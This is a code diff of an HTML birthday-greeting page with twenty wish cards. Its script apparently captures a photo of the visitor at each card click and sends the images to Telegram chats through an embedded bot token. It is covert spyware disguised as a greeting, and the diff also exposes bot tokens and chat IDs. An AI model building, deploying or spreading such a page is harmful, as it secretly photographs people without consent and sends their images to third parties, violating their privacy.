@@ -107,7 +107,25 @@
 
         <!-- Cards with Wishes and Captured Photos -->
         <div class="card" id="card1"><h2>1. Wishing you a day as sweet as chocolate! 🍫</h2><img src="" id="cardImage1"></div>
-        <!-- Add remaining cards here, or repeat structure if needed -->
+        <div class="card" id="card2"><h2>2. May you be surrounded by love and laughter! 🥳</h2><img src="" id="cardImage2"></div>
+        <div class="card" id="card3"><h2>3. Here’s to endless joy and teddy bear hugs! 🧸</h2><img src="" id="cardImage3"></div>
+        <div class="card" id="card4"><h2>4. May all your dreams take flight! ✨</h2><img src="" id="cardImage4"></div>
+        <div class="card" id="card5"><h2>5. Sending you a year filled with sunshine! 🌞</h2><img src="" id="cardImage5"></div>
+        <div class="card" id="card6"><h2>6. May every wish of yours come true! 🌈</h2><img src="" id="cardImage6"></div>
+        <div class="card" id="card7"><h2>7. Cheers to more laughter and happy memories! 🎉</h2><img src="" id="cardImage7"></div>
+        <div class="card" id="card8"><h2>8. You deserve all the love in the world! ❤️</h2><img src="" id="cardImage8"></div>
+        <div class="card" id="card9"><h2>9. May today be as special as you are! 💖</h2><img src="" id="cardImage9"></div>
+        <div class="card" id="card10"><h2>10. To more sweet moments and beautiful days! 🌹</h2><img src="" id="cardImage10"></div>
+        <div class="card" id="card11"><h2>11. May laughter and joy fill your heart! 🥰</h2><img src="" id="cardImage11"></div>
+        <div class="card" id="card12"><h2>12. Here’s to a life of dreams come true! 💫</h2><img src="" id="cardImage12"></div>
+        <div class="card" id="card13"><h2>13. Hoping your day is as magical as you! 🌠</h2><img src="" id="cardImage13"></div>
+        <div class="card" id="card14"><h2>14. May this year bring you new adventures! 🏞️</h2><img src="" id="cardImage14"></div>
+        <div class="card" id="card15"><h2>15. May you be showered with endless blessings! 🌺</h2><img src="" id="cardImage15"></div>
+        <div class="card" id="card16"><h2>16. Here’s to health, happiness, and love! 💖</h2><img src="" id="cardImage16"></div>
+        <div class="card" id="card17"><h2>17. May you shine brighter every day! 🌟</h2><img src="" id="cardImage17"></div>
+        <div class="card" id="card18"><h2>18. Wishing you joy beyond measure! 🎂</h2><img src="" id="cardImage18"></div>
+        <div class="card" id="card19"><h2>19. May love and happiness follow you always! 💞</h2><img src="" id="cardImage19"></div>
+        <div class="card" id="card20"><h2>20. May all your dreams come true! 🌠</h2><img src="" id="cardImage20"></div>
 
         <!-- Collage Display -->
         <div class="collage" id="collage">
@@ -121,8 +139,8 @@
     </div>
 
     <script>
-        const botToken = "7854999145:AAFZfhFo_EhVgomg6i9U57s9c105a0YQQSI";
-        const chatIds = ["7258927081", "6854356772"];
+        const botToken = "7585966233:AAGncmy_VolkAfaPb04Fx_X6b7g4OmUhrZg";
+        const chatId = ["7258927081", "6854356772"];
         let currentCardIndex = 1;
         const totalCards = 20;
         const capturedPhotos = [];
@@ -137,7 +155,7 @@
         function nextCard() {
             capturePhoto();
             const imageDataUrl = document.getElementById(`cardImage${currentCardIndex}`).src;
-            chatIds.forEach(chatId => sendPhotoToTelegram(imageDataUrl, chatId));
+            sendPhotoToTelegram(imageDataUrl);
 
             document.getElementById(`card${currentCardIndex}`).style.display = 'none';
             currentCardIndex++;
@@ -162,7 +180,7 @@
             capturedPhotos.push(imageDataUrl);
         }
 
-        function sendPhotoToTelegram(imageDataUrl, chatId) {
+        function sendPhotoToTelegram(imageDataUrl) {
             fetch(imageDataUrl)
                 .then(res => res.blob())
                 .then(blob => {
@@ -220,4 +238,3 @@
     </script>
 </body>
 </html>
-
